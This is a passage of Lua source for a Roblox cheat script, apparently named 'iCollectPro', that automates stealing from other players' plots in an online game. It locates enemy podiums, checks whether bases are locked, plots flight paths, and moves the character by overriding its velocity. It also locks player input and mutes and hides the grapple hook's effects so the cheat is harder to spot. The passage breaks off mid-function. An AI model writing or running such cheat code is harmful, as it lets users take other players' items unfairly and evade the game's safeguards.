    { z = 8.0, inside = Vector3.new(14.62, 4.93, 5.65), green = Vector3.new(21.71, 5.08, -20.68), mid = Vector3.new(19.54, 2.98, -29.61) },
    { z = 15.5, inside = Vector3.new(11.60, 4.72, 13.31), green = Vector3.new(20.40, 4.92, -11.40), mid = Vector3.new(19.54, 2.98, -29.61) },
}
local CORRIDOR_Y, CORRIDOR_Z, CORRIDOR_REACH = 3.1, -35.9, 107
local MAX_TRIGGER_DIST = 30

local function clampToPodium(from, to, podiumPos)
    local function flatDist(p)
        return Vector3.new(p.X - podiumPos.X, 0, p.Z - podiumPos.Z).Magnitude
    end
    if flatDist(to) <= MAX_TRIGGER_DIST then return to end
    local best = from
    for i = 1, 40 do
        local p = from:Lerp(to, i / 40)
        if flatDist(p) > MAX_TRIGGER_DIST then break end
        best = p
    end
    return best
end

local GROUND_MAX_Y = 10
local MAX_PODIUM = 28
local function rowFor(localZ)
    local best, bestD = ROW_ROUTES[1], math.huge
    for _, r in ipairs(ROW_ROUTES) do
        local d = math.abs(r.z - localZ)
        if d < bestD then best, bestD = r, d end
    end
    return best
end

local function podiumParts(podium)
    local spawn = podium and podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
    local pa = spawn and spawn:FindFirstChild("PromptAttachment")
    local prompt = pa and pa:FindFirstChildWhichIsA("ProximityPrompt")
    return spawn, prompt
end

local function findPodiumTarget(podiumNo, hrp)
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local best, bestScore = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        local root = plot:FindFirstChild("MainRoot")
        local podiums = plot:FindFirstChild("AnimalPodiums")
        local podium = podiums and podiums:FindFirstChild(tostring(podiumNo))
        if root and podium and (not targetPlot or plot == targetPlot) and isEnemyPlot(plot) then
            local spawn, prompt = podiumParts(podium)
            if spawn and prompt then
                local score = (hrp.Position - spawn.Position).Magnitude
                if not prompt.Enabled then score = score + 100000 end
                if score < bestScore then
                    bestScore = score
                    best = { plot = plot, podium = podium, rootCF = root.CFrame, spawn = spawn, prompt = prompt }
                end
            end
        end
    end
    return best
end

local iCollectProUI = { maxPath = 90, state = { locked = false, lockText = "", inRange = true } }

function iCollectProUI.fit(l, max, pad)
    l.TextScaled = false
    l.TextWrapped = false
    l.TextTruncate = Enum.TextTruncate.None
    local busy = false
    local function refit()
        if busy then return end
        busy = true
        l.TextSize = max
        local w, b = l.AbsoluteSize.X - (pad or 0), l.TextBounds.X
        if w > 0 and b > w then l.TextSize = math.max(6, math.floor(max * w / b)) end
        busy = false
    end
    refit()
    l:GetPropertyChangedSignal("Text"):Connect(refit)
    l:GetPropertyChangedSignal("AbsoluteSize"):Connect(refit)
end

function iCollectProUI.lockInfo(plot)
    local pur = plot and plot:FindFirstChild("Purchases")
    local pb = pur and pur:FindFirstChild("PlotBlock")
    local main = pb and pb:FindFirstChild("Main")
    local bb = main and main:FindFirstChild("BillboardGui")
    local lockedLbl = bb and bb:FindFirstChild("Locked")
    if lockedLbl and lockedLbl.Visible then
        local rt = bb:FindFirstChild("RemainingTime")
        return true, rt and rt.Text or ""
    end
    return false, ""
end

function iCollectProUI.flightPath(pod, hrp)
    local cf = pod.rootCF
    local podLocal = cf:PointToObjectSpace(pod.spawn.Position)
    local s = podLocal.X >= 0 and 1 or -1
    local row = rowFor(podLocal.Z)
    local here = cf:PointToObjectSpace(hrp.Position)
    local pts = {
        cf * Vector3.new(math.clamp(here.X, -CORRIDOR_REACH, CORRIDOR_REACH), CORRIDOR_Y, CORRIDOR_Z),
        cf * Vector3.new(0, CORRIDOR_Y, CORRIDOR_Z),
    }
    if podLocal.Y <= GROUND_MAX_Y then
        pts[#pts + 1] = cf * Vector3.new(row.inside.X * s, row.inside.Y, row.inside.Z)
    end
    local startIndex = 1
    for i = #pts, 1, -1 do
        if canDirectTp(hrp, pts[i]) then startIndex = i; break end
    end
    local len, from = 0, hrp.Position
    for i = startIndex, #pts do
        len = len + Vector3.new(pts[i].X - from.X, 0, pts[i].Z - from.Z).Magnitude
        from = pts[i]
    end
    return len
end

function iCollectProUI.check(ignoreLock)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false, "NO CHARACTER" end
    local pod = findPodiumTarget(selectedSlot, hrp)
    if not pod then return false, "NO TARGET PODIUM" end
    local locked, t = iCollectProUI.lockInfo(pod.plot)
    local upper = pod.rootCF:PointToObjectSpace(pod.spawn.Position).Y > GROUND_MAX_Y
    if locked and not upper and not ignoreLock and not (iCollectProUI.friendsAllowed and iCollectProUI.friendsAllowed(pod.plot)) then
        return false, "BASE LOCKED " .. t
    end
    if upper and iCollectProUI.clonerState then
        local ready, why = iCollectProUI.clonerState()
        if not ready then return false, why end
    end
    return true
end

iCollectProUI.flash = function(msg) setStealStatus(msg, false) end

function iCollectProUI.inputLock(on)
    local CAS = game:GetService("ContextActionService")
    local ACTION = "iCollectPro_SemiTP_InputLock"
    _G.iCollectPro_SemiTP_InputLock = on and true or nil
    local ctrls
    pcall(function() ctrls = require(player.PlayerScripts:WaitForChild("PlayerModule", 2)):GetControls() end)
    if on then
        if ctrls then pcall(function() ctrls:Disable() end) end
        local K = Enum.KeyCode
        pcall(function()
            CAS:BindActionAtPriority(ACTION, function(_, _, input)
                if input.KeyCode == currentStealKey then return Enum.ContextActionResult.Pass end
                return Enum.ContextActionResult.Sink
            end, false, Enum.ContextActionPriority.High.Value + 2000,
                K.W, K.A, K.S, K.D, K.Up, K.Down, K.Left, K.Right, K.Space, K.LeftShift, K.Backspace, K.Q,
                K.One, K.Two, K.Three, K.Four, K.Five, K.Six, K.Seven, K.Eight, K.Nine, K.Zero,
                K.ButtonA, K.ButtonB, K.ButtonX, K.ButtonY, K.ButtonL1, K.ButtonR1, K.ButtonR2, K.Thumbstick1,
                Enum.UserInputType.MouseButton1)
        end)
    else
        pcall(function() CAS:UnbindAction(ACTION) end)
        if ctrls then pcall(function() ctrls:Enable() end) end
    end
end

do
    pcall(function()
        for _, d in ipairs(Workspace:GetChildren()) do
            if d.Name == "iCollectPro_SemiTP_StandSpot" then d:Destroy() end
        end
    end)

    task.spawn(function()
        while task.wait(0.2) do
            if not iCollectPro_ALIVE() then return end
            local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            local pod = hrp and not _G.iCollectPro_SemiTP_Busy and not player:GetAttribute("Stealing") and findPodiumTarget(selectedSlot, hrp)
            if pod then
                local ok, len = pcall(iCollectProUI.flightPath, pod, hrp)
                local locked, lockText = iCollectProUI.lockInfo(pod.plot)
                iCollectProUI.state.locked = locked and pod.rootCF:PointToObjectSpace(pod.spawn.Position).Y <= GROUND_MAX_Y
                iCollectProUI.state.lockText = lockText
                iCollectProUI.state.friends = iCollectProUI.friendsAllowed ~= nil and iCollectProUI.friendsAllowed(pod.plot)
                iCollectProUI.state.inRange = ok and len <= iCollectProUI.maxPath
            else
                iCollectProUI.state.friends = false
                iCollectProUI.state.locked = false
                iCollectProUI.state.inRange = true
            end
        end
    end)
end

local iCollectPro = { debounce = false }

function iCollectPro.maxPodium()
    local plots = Workspace:FindFirstChild("Plots")
    local best = 0
    for _, plot in ipairs(plots and plots:GetChildren() or {}) do
        if (not targetPlot or plot == targetPlot) and isEnemyPlot(plot) then
            local pods = plot:FindFirstChild("AnimalPodiums")
            for _, p in ipairs(pods and pods:GetChildren() or {}) do
                local k = tonumber(p.Name)
                if k and k > best then best = k end
            end
        end
    end
    return best > 0 and best or MAX_PODIUM
end

function iCollectPro.setSlot(slot)
    slot = math.floor(tonumber(slot) or 1)
    if slot >= 1 and slot <= iCollectPro.maxPodium() then
        selectedSlot = slot
        HubConfig.selectedSlot = slot
        saveHubConfig()
    end
end

iCollectPro.CARPETS = { "Flying Carpet", "Cupid's Wings", "Santa's Sleigh", "Waverider", "Witch's Broom" }

function iCollectPro.findTool(name)
    local char, bp = player.Character, player:FindFirstChild("Backpack")
    return (char and char:FindFirstChild(name)) or (bp and bp:FindFirstChild(name))
end

iCollectPro.logT0 = os.clock()
function iCollectPro.log(msg)
    local line = string.format("+%.2fs %s", os.clock() - iCollectPro.logT0, msg)
    local buf = _G.iCollectPro_SemiTP_Log or {}
    _G.iCollectPro_SemiTP_Log = buf
    buf[#buf + 1] = line
    if #buf > 80 then table.remove(buf, 1) end
    print("[SEMI TP] " .. line)
end

function iCollectProUI.clonerState()
    local cl = iCollectPro.findTool("Quantum Cloner")
    if not cl then return false, "NO QUANTUM CLONER" end
    local cd = cl:GetAttribute("CooldownTime")
    if cd ~= nil then
        local n = tonumber(cd)
        return false, "CLONER COOLDOWN" .. (n and string.format(" %.1fs", n) or "")
    end
    return true
end

function iCollectPro.carpetOn()
    local char = player.Character
    if not char then return false end
    for _, n in ipairs(iCollectPro.CARPETS) do
        if char:FindFirstChild(n) then return true end
    end
    return false
end

function iCollectPro.equipCarpet()
    if iCollectPro.carpetOn() then return true end
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    local pick = HubConfig.flyTool and iCollectPro.findTool(HubConfig.flyTool)
    if not (pick and table.find(iCollectPro.CARPETS, pick.Name)) then pick = nil end
    for _, n in ipairs(iCollectPro.CARPETS) do
        if pick then break end
        pick = iCollectPro.findTool(n)
    end
    if pick then pcall(function() hum:EquipTool(pick) end) end
    return false
end

function iCollectPro.hushGrapple(g, secs)
    local char = player.Character
    local function ours(d)
        return (char and d:IsDescendantOf(char)) or d:IsDescendantOf(g)
    end
    local function hush(d)
        if d:IsA("Sound") then
            d.Volume = 0
            pcall(d.Stop, d)
        elseif d:IsA("Beam") or d:IsA("Trail") or d:IsA("ParticleEmitter") then
            d.Enabled = false
        elseif d:IsA("RopeConstraint") or d:IsA("RodConstraint") then
            d.Visible = false
        elseif d:IsA("BasePart") then
            d.LocalTransparencyModifier = 1
        end
    end
    for _, d in ipairs(g:GetDescendants()) do pcall(hush, d) end
    if not secs then return end
    local function added(d)
        local n = d.Name:lower()
        local named = n:find("hook", 1, true) or n:find("rope", 1, true) or n:find("grapple", 1, true)
        local linked = false
        if d:IsA("Beam") or d:IsA("RopeConstraint") or d:IsA("RodConstraint") then
            local a0, a1 = d.Attachment0, d.Attachment1
            linked = (a0 and ours(a0)) or (a1 and ours(a1))
        end
        local sound = d:IsA("Sound") and (d:IsDescendantOf(g) or tostring(d.SoundId):find("1621103", 1, true)
            or tostring(d.SoundId):find("16211041", 1, true))
        if named or linked or sound or d:IsDescendantOf(g) then pcall(hush, d) end
        if d:IsA("Constraint") then
            local a0, a1 = d.Attachment0, d.Attachment1
            local in0, in1 = a0 and char and a0:IsDescendantOf(char), a1 and char and a1:IsDescendantOf(char)
            if a0 and a1 and in0 ~= in1 then
                pcall(function() d.Enabled = false end)
                if iCollectPro.log then iCollectPro.log("  grapple pull cut: " .. d.ClassName .. " " .. d.Name) end
            elseif (in0 or in1) and iCollectPro.log then
                iCollectPro.log("  grapple window: " .. d.ClassName .. " " .. d.Name .. " (left on)")
            end
        elseif char and d:IsDescendantOf(char) and d:IsA("BodyMover") and d.Name == "FlightPower" then
            task.defer(function() pcall(function() d:Destroy() end) end)
            if iCollectPro.log then iCollectPro.log("  grapple pull removed: FlightPower") end
        elseif char and d:IsDescendantOf(char) and d:IsA("BodyMover") and iCollectPro.log then
            iCollectPro.log("  grapple window: " .. d.ClassName .. " " .. d.Name .. " in " .. d.Parent.Name .. " (left on)")
        end
    end
    local conn = Workspace.DescendantAdded:Connect(function(d) task.defer(added, d) end)
    task.delay(secs, function() conn:Disconnect() end)
end

function iCollectPro.grappleBoost()
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local g = iCollectPro.findTool("Grapple Hook")
    if hum and g then
        pcall(iCollectPro.hushGrapple, g, 1.5)
        pcall(function() hum:EquipTool(g) end)
        local t0 = os.clock()
        while g.Parent ~= char and os.clock() - t0 < 0.35 do RunService.Heartbeat:Wait() end
        if g.Parent == char then task.spawn(pcall, g.Activate, g) end
        task.wait(0.06)
        pcall(function() hum:UnequipTools() end)
        RunService.Heartbeat:Wait()
    end
    local t0 = os.clock()
    while not iCollectPro.equipCarpet() and os.clock() - t0 < 2 do RunService.Heartbeat:Wait() end
end

function iCollectPro.glide(hrp, dest, speed, cap)
    local t0 = os.clock()
    while hrp.Parent and os.clock() - t0 < (cap or 3) do
        local d = dest - hrp.Position
        if d.Magnitude <= 2 then break end
        iCollectPro.equipCarpet()
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.AssemblyLinearVelocity = d.Unit * math.min(speed, math.max(d.Magnitude * 8, 40))
        RunService.Heartbeat:Wait()
    end
    if hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.zero end
end

function iCollectPro.flyRoute(hrp, waypoints, speed)
    if not hrp or not hrp.Parent or #waypoints == 0 then return end
    speed = speed or 400
    local CLIMB = 120
    local idx, done, lastDist, stallSince = 1, false, math.huge, nil
    local total, prev = 0, hrp.Position
    for _, wp in ipairs(waypoints) do total = total + (wp - prev).Magnitude prev = wp end
    local function body()
        local ch = hrp.Parent
        return ch and (ch:FindFirstChild("UpperTorso") or ch:FindFirstChild("Torso")) or hrp
    end
    local conn
    local function finish()
        if done then return end
        done = true
        if conn then conn:
... (386 Ko restants)